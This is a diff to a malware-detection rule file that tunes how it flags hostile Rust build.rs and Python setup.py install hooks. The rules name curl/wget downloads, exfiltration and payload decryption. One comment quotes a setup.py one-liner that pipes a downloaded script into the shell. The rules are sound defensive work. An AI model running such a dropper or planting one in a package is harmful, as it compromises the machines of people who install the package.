@@ -315,7 +315,7 @@ traits:
     if:
       type: text
       regex: >-
-        std::env::var\w*(?!\s*\(\s*"OUT_DIR"\s*\))[\s\S]{0,290}Command::new\s*\(\s*"curl"
+        std::env::var\w*[\s\S]{0,290}Command::new\s*\(\s*"curl"
   - id: rust-build-rs-env-wget-command
     desc: build.rs shells env to wget
     crit: component
@@ -357,14 +357,6 @@ traits:
     if:
       type: text
       substr: "while [ ! -f '{b}' ]; do sleep 1; done; sleep 2; '{b}' start"
-  - id: rust-build-rs-command-output
-    desc: build.rs captures command output
-    crit: component
-    conf: 0.88
-    for: [rust]
-    if:
-      type: text
-      substr: ".output()"
   - id: rust-build-rs-command-status
     desc: build.rs waits on command status
     crit: component
@@ -578,15 +570,10 @@ traits:
     for: [python]
     if:
       type: text
-      substr: "openrewrite"  # Benign-context suppressor for the standard sdist clean command,
-  # `os.system("rm -rf ./build ./dist ./*.egg-info")`. It previously lived in
-  # composite_rules with BOTH an `all:` clause and this `if:` regex; a rule
-  # carrying `all:` loads as a composite and the inline `if:` was dropped, so
-  # the regex never applied and what remained was "a setup.py that calls
-  # os.system". That is also exactly the two legs of setup-py-os-system-file,
-  # which lists this in `unless:` -- requirement and suppressor were the same
-  # fact, so that rule could never fire. Anchoring on `.egg-info` keeps this
-  # narrow: it is a Python build artifact, not something a dropper names.
+      substr: "openrewrite"  # Benign context for standard sdist cleanup.
+  # The cleanup matcher below is intentionally specific to deleting the
+  # package's generated .egg-info tree; generic setup.py command execution is
+  # a neutral micro-behavior and is not a supply-chain conclusion.
   - id: setup-py-clean-command-removes-build-artifacts
     desc: setup.py clean removes build artifacts
     crit: notable
@@ -597,6 +584,19 @@ traits:
       regex: 'os\.system\([^\n]{0,120}rm\s+-[^\n]{0,120}\.egg-info'
 
 composite_rules:
+  - id: rust-build-rs-command-output
+    desc: build.rs captures command output
+    crit: component
+    conf: 0.88
+    for: [rust]
+    all:
+      # `.output()` is a normal Rust process API and also appears in
+      # application code (for example, a Telegram transport invoking curl).
+      # Tie this build-hook atom to the filename before composites use it as
+      # evidence of build-time execution or exfiltration.
+      - id: rust-build-rs-file
+      - id: micro-behaviors/process/create/direct::rust-command-output
+
   - id: rust-build-rs-host-profile-fields
     desc: build.rs builds host profile fields
     crit: component
@@ -636,9 +636,9 @@ composite_rules:
   # build-script context belongs on the filename, which rust-build-rs-file
   # already establishes precisely.
   - id: rust-build-rs-shell-command
-    desc: build.rs with shell Command execution
-    crit: suspicious
-    conf: 0.75
+    desc: build.rs executes a shell command
+    crit: notable
+    conf: 0.9
     for: [rust]
     all:
       - id: rust-build-rs-file
@@ -709,40 +709,6 @@ composite_rules:
     all:
       - id: metadata/build/pip::root-setup-py
       - id: requests-get-near-os-system
-  - id: setup-py-os-system-file
-    desc: setup.py invokes os.system
-    crit: suspicious
-    conf: 0.95
-    for: [python]
-    # `scope: leaf` -> `file`: root-setup-py is path/identity evidence, which
-    # does not share a leaf key with the file's content evidence, so under
-    # `leaf` the two legs could never co-occur. `file` still keys to the single
-    # setup.py member, so an archive cannot pool "a setup.py exists" with an
-    # os.system call sitting in some unrelated module.
-    scope: file
-    # `near_bytes` removed: one leg is root-setup-py, a path/identity fact with
-    # no byte location in the file, so proximity against a code fact could
-    # never be satisfied and the rule was unsatisfiable regardless of content.
-    # It also bought nothing semantically -- both legs are statements about the
-    # same single file, not about two things that need to sit near each other.
-    unless:
-      - id: metadata/package/testing/presence/harness/
-      - id: metadata/build/pip::python-packaging-tool-tests
-      - id: setup-py-clean-command-removes-build-artifacts
-      - id: well-known/app/finance/electron-cash/
-    # The bare `dunder-import-call` leg (any `__import__`) was removed because it
-    # fired on the benign `__import__("os").path.exists("README.md")` idiom that
-    # setup.py files use for long_description, mislabeling it as an os.system
-    # invocation. An earlier note here claimed `python-os-system` already covered
-    # the obfuscated `__import__("os").system(...)` spelling as well; it does not
-    # -- its regex is `\bos\.system\s*\(`, and in that spelling the characters
-    # before `.system` are `")`. Both spellings are now listed explicitly, so
-    # dropping the over-broad leg costs no coverage.
-    all:
-      - id: metadata/build/pip::root-setup-py
-    any:
-      - id: micro-behaviors/process/create/system::python-os-system
-      - id: micro-behaviors/process/create/system::python-dunder-import-os-system
   - id: python-setup-encoded-dropper
     desc: setup.py decodes and executes downloaded payload
     crit: hostile
@@ -811,9 +777,9 @@ composite_rules:
   # commonest one-liner form fell through both filters: a root setup.py doing
   #   os.system("curl -s https://host/i.sh | sh")
   # contains neither anchor (a dropper does not mention its own filename) and has
-  # no Python exec sink -- the shell does the executing. It reached one suspicious
-  # atom (setup-py-os-system-file) and risk 40, while the same command in an npm
-  # postinstall reaches 268.
+  # no Python exec sink -- the shell does the executing. The dedicated
+  # setup-py-download-pipe-shell rule below covers this form, while a plain
+  # publish or build command remains outside the supply-chain objective.
   #
   # Uses the packaging *identity* fact rather than a text anchor, and requires
   # the pipe to sit in an execution call, so a setup.py that merely quotes
@@ -877,6 +843,22 @@ composite_rules:
     unless:
       - id: setup-py-network-known-package-profile
       - id: metadata/package/testing/
+  - id: setup-py-encrypted-build-hook-fetch
+    desc: setup.py build hook decrypts and fetches a remote payload
+    crit: hostile
+    conf: 0.99
+    for: [python]
+    scope: file
+    attack: T1195.002,T1027,T1105
+    all:
+      - id: metadata/build/pip::setup-py
+      - id: metadata/build/package/recipe::setuptools-build-py-run-override
+      - id: metadata/build/package/recipe::run-override-calls-helper-after-super
+      - id: micro-behaviors/crypto/symmetric/aes/library::cryptography-aesgcm-api
+      - id: micro-behaviors/crypto/symmetric/decrypt::python-decrypt-method-call
+      - id: micro-behaviors/communications/http/lib/urllib::urllib-urlopen-call
+    unless:
+      - id: metadata/package/testing/
   - id: python-setup-trojan
     desc: Python setup.py trojan
     crit: hostile
@@ -884,13 +866,8 @@ composite_rules:
     for: [python]
     scope: leaf
     any:
-      # setup-py-os-system-file is deliberately NOT a leg here. Every other
-      # alternative below requires download-and-execute; that one requires only
-      # "a root setup.py calls os.system", which legitimate build scripts do to
-      # run make, drive a compiler or generate sources -- verified: a setup.py
-      # whose only shell call is `os.system("make -j4")` was convicted hostile
-      # while this leg was present. It stands on its own at `suspicious`, the
-      # criticality the trait itself declares.
+      # Every alternative below requires download-and-execute; ordinary setup.py
+      # build commands are intentionally left to the neutral process traits.
       - id: setup-py-curl-exec
       - id: setup-py-urlopen-exec
       - id: setup-py-wget-tmp-bash
@@ -952,7 +929,7 @@ composite_rules:
     for: [rust]
     all:
       - id: rust-build-rs-file
-      - id: micro-behaviors/process/create/direct::rust-process-command
+      - id: micro-behaviors/process/create/direct::rust-spawn
   - id: rust-build-rs-download-command
     desc: build.rs invokes curl or wget
     crit: notable
@@ -991,6 +968,8 @@ composite_rules:
     any:
       - id: micro-behaviors/communications/url/external/github::github-release-download
       - id: micro-behaviors/communications/url/external/github::github-archive-ref-download
+    unless:
+      - id: metadata/build/toolchain::conditional-wasi-sdk-bootstrap
   - id: rust-build-rs-http-post
     desc: Cargo build script sends HTTP POST
     crit: notable
@@ -1169,25 +1148,6 @@ composite_rules:
     all:
       - id: rust-proc-macro-entrypoint
       - id: rust-proc-macro-env-http-post
-  - id: rust-build-trojan
-    desc: Rust build.rs trojan
-    crit: notable
-    conf: 0.85
-    for: [rust]
-    all:
-      - id: rust-build-rs-file
-    any:
-      - id: rust-build-rs-shell-command
-      - id: rust-build-rs-download-command
-      - id: rust-build-rs-network
-      - id: rust-build-rs-env-exfil
-      - id: rust-build-rs-target-start
-      - id: rust-build-rs-delayed-target-start
-      - id: rust-build-rs-post-exfil
-      - id: rust-build-rs-staged-payload-exec
-      - id: rust-build-rs-native-link-staging
-    unless:
-      - id: objectives/supply-chain/install-hook/build/behavioral/
   - id: rust-build-rs-target-start
     desc: build.rs executes package binary
     crit: suspicious
@@ -1339,7 +1299,6 @@ composite_rules:
     any:
       - id: python-setup-trojan
       - id: npm-install-trojan
-      - id: rust-build-trojan
       - id: rust-build-rs-telegram-curl-beacon
       - id: rust-build-rs-post-exfil
       - id: rust-build-rs-staged-payload-exec
